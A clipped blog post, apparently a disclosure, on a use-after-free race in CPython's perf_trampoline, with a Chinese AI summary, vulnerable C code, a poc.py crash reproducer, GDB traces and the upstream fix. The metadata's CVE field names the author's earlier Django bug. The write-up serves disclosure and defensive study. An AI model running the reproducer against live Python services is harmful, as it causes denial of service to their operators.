---
title: Use-after-free in CPython’s perf_trampoline via unsynchronised arena teardown
source: https://cyberstan.co.uk/python-uaf-1/
source_host: cyberstan.co.uk
clip_date: 2026-10-01T10:13:11+08:00
trace_id: 81633b2e-d2d0-47c7-9f7f-82c66fdc16a7
content_hash: ac8d8916edbd649f13b845480ad79eb182cd1046fb3567463b5c21db8fdb60fd
status: synced
tags:
  - 漏洞分析
  - AI辅助逆向
series: null
feed_source: cyberstan·内核/虚拟化
ai_summary: CPython 停用 perf trampoline 时无条件 munmap 可执行页，未与其他线程的指令指针同步，导致 use-after-free 崩溃。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ec75244-d011-816c-baa1-d3f86501f90c
ioc:
  cves:
    - CVE-2025-64459
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> CPython 停用 perf trampoline 时无条件 munmap 可执行页，未与其他线程的指令指针同步，导致 use-after-free 崩溃。
> 
> - **根因：** `sys.deactivate_stack_trampoline()` 走 `free_code_arenas` 直接 `munmap`：释放路径上没有 GIL、没有 per-arena 引用计数、也没有静默检查。
> - **崩溃链：** 工作线程 PC 停在 trampoline 页内 → 主线程 munmap 摘除页表项 → 返回或异常展开时读取已消失的返回地址 → SIGSEGV。3.12 直接段错误；3.13/3.14-dev 先被 Tier 2 状态检查拦成 `SystemError: error return without exception set`，根因相同。
> - **复现与取证：** `taskset -c 0` 把进程钉单核迫使时间片交错，能大幅收紧竞态窗口；poc.py 起 8 个繁忙线程并无 sleep 地反复 toggle 激活/停用，数秒即崩。GDB 核心转储显示 munmap 线程与被展开线程的 pc `0x725ab661e00a` 报 “Cannot access memory”。
> - **修复：** 借 `PyCode_AddWatcher` 给每个 arena 加引用计数，停用只标记删除，代码对象销毁时递减，归零才 munmap，使 arena 寿命覆盖调用方。3.13/3.14-dev 已修（PR #143233）；3.12 处于仅安全修复模式，backport 被认为侵入过大而标记 Won't Fix。
> - **影响与发现：** 现实威胁是解释器 DoS，未证实可升级为更严重利用；该漏洞由扫描器换用 libclang 前端发现——调用图节点带 ALLOCATED/FREED/DEREFERENCED 生命周期状态，验证器用反向 BFS 从公开 API 确认“释放后解引用同一指针且无再分配”的可达路径。

January 2026 · CPython Issue #143228 · Fix PR #143233 · Patched in 3.13/3.14, 3.12 marked Won’t Fix

The scanner I wrote to find [the Django SQL injection](https://cyberstan.co.uk/cve-2025-64459/) was Python-only. Swapping its graph ingestion from Python’s `ast` module to libclang took a weekend and left the reasoning core untouched, and the first thing the C backend turned up was a use-after-free in CPython’s own perf_trampoline. Details of how it got there are at the end; the bug itself first.

`sys.deactivate_stack_trampoline()` munmaps executable pages without checking whether other threads are currently running code on them. The cleanup function `free_code_arenas` just unmaps, so the OS pulls the page table entries out from under any thread whose instruction pointer is sitting on those pages. On Python 3.12 that is an immediate SIGSEGV. On 3.13 and 3.14-dev the Tier 2 executor’s internal state checks catch the corrupted frame first and turn it into `SystemError: error return without exception set`, which is the same root cause landing more softly.

## The bug

perf_trampoline exists to help Linux perf map JIT-style trampoline frames back to Python source. When `sys.activate_stack_trampoline("perf")` is called, the interpreter mmaps executable pages and writes small trampoline stubs into them. `sys.deactivate_stack_trampoline()` releases those pages, and the release path is `free_code_arenas`:

```cpp
// Python/perf_trampoline.c

static void
free_code_arenas(void)
{
    code_arena_t *cur = perf_code_arena;
    code_arena_t *prev;
    perf_code_arena = NULL;
    while (cur) {
        // Unmaps unconditionally: nothing here is tracking whether a
        // thread is executing on this page or unwinding a frame through it.
        munmap(cur->start_addr, cur->size);
        prev = cur->prev;
        PyMem_RawFree(cur);
        cur = prev;
    }
}
```

The execution path that consumes those pages is `py_trampoline_evaluator`:

```javascript
static PyObject *
py_trampoline_evaluator(PyThreadState *ts, _PyInterpreterFrame *frame, int throw)
{
    // f points into mmap'd trampoline memory. The CPU's instruction
    // pointer moves into the danger zone when this call dispatches.
    return f(ts, frame, throw, _PyEval_EvalFrameDefault);
}
```

Between those two functions there is no GIL acquisition on the deactivation path, no per-arena refcount and no quiescence check, so nothing stops `munmap` racing a thread whose PC is inside the page being unmapped. The crashing interleaving goes like this:

1.  Worker thread enters a trampoline frame. Its PC is now at some address inside the arena, say 0x725ab661e00a.
2.  Main thread calls `sys.deactivate_stack_trampoline()`, which reaches `free_code_arenas` and munmaps. The kernel removes the page table entry.
3.  Worker thread tries to return from the frame, or hits an exception path that needs to unwind through it, and libgcc’s stack unwinder reads the saved PC from the trampoline frame to find the return address.
4.  That address is no longer mapped, so the read faults and the process takes a SIGSEGV.

The race window munmap unmaps the arena while a worker thread’s instruction pointer is still inside it. arena page mapped, stubs executing unmapped — page table entry gone Worker thread enters frame, PC = 0x…e00a unwind reads saved PC → SIGSEGV Main thread munmap() the arena time → pinning to a single core forces these to interleave on the same hardware, tightening the window

munmap removes the arena page while a worker is still executing in it, so the next unwind reads a saved PC from memory that no longer exists.

## Reproduction

The race is hard to hit on multi-core systems, because the destroyer thread and the worker threads tend to land on different physical cores and the worker never context-switches off its PC at the moment munmap lands. Pinning the whole process to a single core forces the kernel to time-slice the threads on shared hardware, which tightens the window dramatically. On my machine the crash takes a few seconds with `taskset -c 0` and effectively never reproduces without it.

```
taskset -c 0 python3 poc.py
```

```python
# poc.py
import sys
import threading
import os

def heavy_workload():
    # Keep workers inside the trampoline evaluator.
    while True:
        _ = sum(i * i for i in range(500))

def trigger_race():
    print(f"[+] PID: {os.getpid()}")
    for _ in range(8):
        t = threading.Thread(target=heavy_workload, daemon=True)
        t.start()

    # Toggle as fast as possible. No sleep. The window is in nanoseconds.
    while True:
        sys.activate_stack_trampoline("perf")
        sys.deactivate_stack_trampoline()

if __name__ == "__main__":
    trigger_race()
```

## Forensic analysis (GDB)

Loading the core dump in GDB shows the race directly. The cleanup thread is mid-munmap:

```bash
Thread 9 (Thread 0x725ad0b00b80 (LWP 12791)):
#0  0x0000725ad0125d7b in __GI_munmap () at ../sysdeps/unix/syscall-template.S:117
#1  0x0000725ad071b9f4 in free_code_arenas () at Python/perf_trampoline.c:315
#2  _PyPerfTrampoline_FreeArenas () at Python/perf_trampoline.c:421
```

The victim thread is unwinding through a frame whose backing memory has just disappeared:

```
Thread 1 (Thread 0x725ace5fd6c0 (LWP 12846) (Exiting)):
#0  x86_64_fallback_frame_state ... at ./md-unwind-support.h:63
        pc = 0x725ab661e00a <error: Cannot access memory at address 0x725ab661e00a>
#1  uw_frame_state_for ...
#2  0x0000725ab6c86c8a in _Unwind_ForcedUnwind_Phase2 ...
```

That PC value, 0x725ab661e00a, is the address inside the trampoline arena that Thread 9’s munmap invalidated milliseconds earlier, and the “Cannot access memory” line is the kernel telling GDB the page is gone. Two threads, one region, one of them unmapping it while the other is still reading from it.

## Impact

On Python 3.12 this is a hard SIGSEGV with no application-level recovery, so the interpreter dies. Any production system that toggles perf profiling on and off, whether that is opt-in profiling per request or time-windowed profiling driven by a scheduler, is exposed to a denial of service from any thread that happens to be in a Python frame at the wrong moment.

On 3.13 and 3.14-dev the Tier 2 executor’s internal state checks detect the corrupted frame state and return a failure code without setting an exception, which surfaces as `SystemError: error return without exception set`. The landing is softer, the underlying state corruption is identical, and the interpreter is left in an undefined state afterwards. The SystemError is a symptom of the race rather than any kind of containment.

Structurally this is a use-after-free, and UAFs can sometimes escalate past a crash if the freed memory is reclaimed with attacker-influenced content, but I have nothing working beyond the denial of service here. The freed region is executable trampoline memory inside a single-process managed runtime rather than a kernel slab cache with cross-object reclaim targets, so interpreter DoS is the realistic threat model.

## The fix

The assumption that `sys.deactivate_stack_trampoline()` can safely munmap arena memory immediately was wrong, because there is no static guarantee that no thread is executing inside it. The fix introduces reference counting tied to code object lifetime through the existing `PyCode_AddWatcher` API.

Each arena now carries a refcount tracking how many code objects have trampoline stubs resident on its pages. Deactivation marks arenas for deletion rather than unmapping them, a code watcher fires when individual code objects are destroyed and decrements the refcount of whichever arena their stub lives in, and munmap runs only once an arena’s refcount reaches zero, at which point no live code object can plausibly still be executing inside it. The arena outlives the deactivation call, for as long as it has to and no longer.

3.13 and 3.14-dev got the patch (PR #143233). 3.12 is in security-fix-only mode and the backport was judged too invasive relative to the threat, which is a DoS that requires `sys.activate_stack_trampoline` to already be in use, so it was marked Won’t Fix.

## The C backend

The scanner is two-stage: an LLM-driven semantic pass that flags suspicious patterns from inferred intent, and a deterministic call graph verifier that discards anything not reachable from a public API. Only the parser changed between the Django finding and this one.

For C, Python’s `ast` module is replaced with libclang’s Python bindings. Function definitions become `CXCursor_FunctionDecl`, calls become `CXCursor_CallExpr`, and the call graph is built exactly as in the Django case. The substantive addition is that each graph node carries a memory-lifecycle state, ALLOCATED, FREED or DEREFERENCED, derived from whether it calls `malloc` / `calloc` / `realloc`, `free` / `munmap`, or dereferences a pointer (`CXCursor_UnaryOperator` with `*`, or `CXCursor_MemberRefExpr`). That lets the verifier model the structural precondition for a UAF: a FREED node and a DEREFERENCED node sharing a pointer with no intervening reallocation.

On `perf_trampoline.c` the Scout flagged `free_code_arenas` for calling `munmap` on an executable region with no visible synchronisation, and `py_trampoline_evaluator` for dereferencing a function pointer into the same region. The reverse-BFS reachability check confirmed that `sys.deactivate_stack_trampoline`, a public Python API, calls `free_code_arenas`, which satisfied the structural condition. The Judge’s verdict was that static analysis confirms a free/dereference pair on a shared region with no intervening reallocation and no visible mutex, and that the temporal ordering the actual race needs is beyond what static analysis can prove, but the complete absence of any synchronisation primitive on the deactivation path is itself the finding.

That is the part I find interesting as a cross-domain case. The Django bug was a missing validator and this one is a missing mutex, in different languages and different vulnerability classes, but the shape underneath is the same: a guardrail that should have been there is not, static analysis can prove the path is reachable, and the LLM can articulate why the absence is dangerous. The architecture was built for the first kind of finding, and the second kind came more or less for free once the C backend existed.
